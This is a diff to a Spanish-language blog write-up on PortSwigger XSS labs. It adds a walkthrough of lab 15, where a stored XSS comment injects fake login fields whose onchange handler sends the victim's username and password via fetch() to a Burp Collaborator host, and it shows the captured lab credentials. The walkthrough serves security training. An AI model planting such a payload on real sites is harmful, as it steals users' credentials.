@@ -1437,7 +1437,7 @@ Así que si vamos a el servidor tercero de BurpCollaborator y damos en **pollNow
 
 ![http](/assets/images/XSS/lab14/HTTP.png)
 
-Vemos que recibimos la respuesta del servidor en el contexto del usuario que vio el comentario, en este caso la respuesta es como la configuramos, se tramita por HTTP dandonos la cookie de sesión como lo programamos en el XSS, y esta cookie de sesión obtenida del usuario que lee todos los comentarios es el valor:
+Vemos que recibimos la respuesta del servidor en el contexto del usuario que vio el comentario, en este caso la respuesta es como la configuramos, se tramita por HTTP dandonos la cookie de sesión como lo programamos en el body de la respuesta, y esta cookie de sesión obtenida del usuario que lee todos los comentarios es el valor:
 
 **session=GfcIhusZ0yuh9Mip8tBq3peYB1ET4IpY**
 
@@ -1461,4 +1461,92 @@ una vez reemplazemos la cookie de sesión, simplemente tramitamos la petición, 
 
 <br>
 
-# 
+# Laboratorio 15: Exploiting cross-site scripting to capture passwords
+
+En este laboratorio 15, vemos lo siguiente:
+
+![lab15](/assets/images/XSS/lab15/lab15.png)
+
+Nos dice que en este laboratorio existe un XSS stored(almacenado), dentro de la sección de comentarios, y que un usuario victima simulado, lee todos los comentarios después de ser publicados, y el objetivo es aprovechar este XSS stored para robar el nombre de usuario y la contraseña de la victima, y iniciar sesión con sus credenciales para completar este laboratorio.
+
+Una vez dentro de la sección de comentarios de un post dentro del laboratorio veremos lo siguiente:
+
+![add](/assets/images/XSS/lab15/add.png)
+
+Vemos que podemos agregar un comentario, así que veremos si es vulnerable a XSS usando etiquetas:
+
+![test](/assets/images/XSS/lab15/test.png)
+
+Vemos que agregaremos el siguiente comentario usando las etiquetas HTML `<p></p>` para ver si se interpretan:
+
+Al postear el comentario vemos lo siguiente:
+
+![post](/assets/images/XSS/lab15/post.png)
+
+Y vemos que no estan las etiquetas HTML, por lo que es vulnerable a XSS al parecer. 
+
+Así que ahora el objetivo no es robar las cookies de sesión, si no obtener el usuario y contraseña del usuario que visita los comentarios después de ser publicados, por lo que usaremos el siguiente código:
+
+```xml
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+Que su funcionamiento es el siguiente:
+
+En la primera linea crea un campo de entrada llamado **username**, y con el identificador único también llamado **username**, y lo que el usuario ingrese en este campo de entrada se guardará dentro de **name**.
+
+En la segunda linea hace otro campo de entrada de tipo **password** que esto hace que los datos ingresados sean cubiertos con asteriscos, y este campo de entrada se llama password también.
+
+Después dentro de el input de password usa **onchange**, que esto se encarga de que cuando haya un cambio en este caso en la entrada de datos de password, lo que hará **onchange** es encargarse de ejecutar algo cada vez que haya un cambio en esa sección indicada, y eso que va a ejecutar es el código que le sigue, y este código es el siguiente:
+
+`if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN'`
+
+Esto va a verificar si en el valor de contraseña hay datos, como seguimos dentro del input de **password** entonces podemos usar **this.value**, para acceder al valor que el usuario ha proporcionado en la entrada de datos de password.
+
+Y en caso de que si haya datos dentro de **password** entonces se realizará una petición por **HTTP** usando la función **fetch()**, y la petición se envia hacía la URL controlada por el atacante, y esta petición se hace por el metodo **POST**, y el modo **no-cors** como recordamos es para desactivar las reglas de seguridad, y por último muestra el valor del usuario y la contraseña en el body de la respuesta de la petición, estas credenciales estan siendo llamadas para que sean visibles en el body, primero se usa **username.value** que como recordamos este es el identificador único del campo de entrada de datos del nombre de usuario. así que se estaría mostrando el nombre de usuario, después concatenamos dos puntos **:** esto para separar el usuario de la contraseña, y finalmente mostramos la contraseña que como recordamos seguimos dentro del input de **password** por lo que usamos **this.value** para mostrar el valor actual del campo donde el usuario ingreso datos en el campo de entrada de datos de password.
+
+`});">`
+
+Y por último cerramos la llave de la configuración de la petición, también cerramos el parentesis de la función fetch, usamos punto y coma para decir que hemos terminado eso, y por ultimo usamos las comillas dobles y el signo de mayor para cerrar el input de password.
+
+<br>
+
+Así que en resumen con esto crearemos 2 campos de entrada de datos, uno de usuario y otro de contraseña y al momento de que un usuario ingrese datos dentro de esto, entonces se enviará esta información hacia nuestro servidor tercero para poder leer las consultas con sus credenciales.
+
+Así que primero iniciaremos el **BurpCollaborator** y copiaremos el host tercero por el cual recibiremos la respuesta de la petición que haremos en el XSS:
+
+![copy](/assets/images/XSS/lab15/copy.png)
+
+Una vez copiemos el host dando a **Copy to clipboard**, lo agregamos a el código como destino de URLy una vez listo nuestro código se verá algo así:
+
+![payload](/assets/images/XSS/lab15/payload.png)
+
+Y una vez publiquemos el comentario, iremos a revisar los registros del BurpCollaborator y veremos una petición **HTTP**:
+
+![http](/assets/images/XSS/lab15/http.png)
+
+La cual contiene las credenciales que ingreso el usuario que lee todos los comentarios y cayo en nuestra trampa obteniendo así sus credenciales en la respuesta como podemos ver: **administrator:iwqjmta4kvoxl1ac5882**.
+
+La forma en que sucedio este ataque es que recordamos que creamos 2 campos de ingresar datos los cuales se agregaron a la web:
+
+![campos](/assets/images/XSS/lab15/campos.png)
+
+Dentro de esos campos si metemos datos, por ejemplo:
+
+![prueba](/assets/images/XSS/lab15/prueba.png)
+
+Y estos datos se envian automaticamente hacia nuestro servidor tercero:
+
+![http2](/assets/images/XSS/lab15/http2.png)
+
+Como podemos ver recibimos lo que ingresamos en esos campos de entrada, gracias a el XSS y las instrucciónes inyectadas.
+
+Y al ingresar con las credenciales de la victima habremos terminado este laboratorio:
+
+![end](/assets/images/XSS/lab15/end.png)
+
+<br>
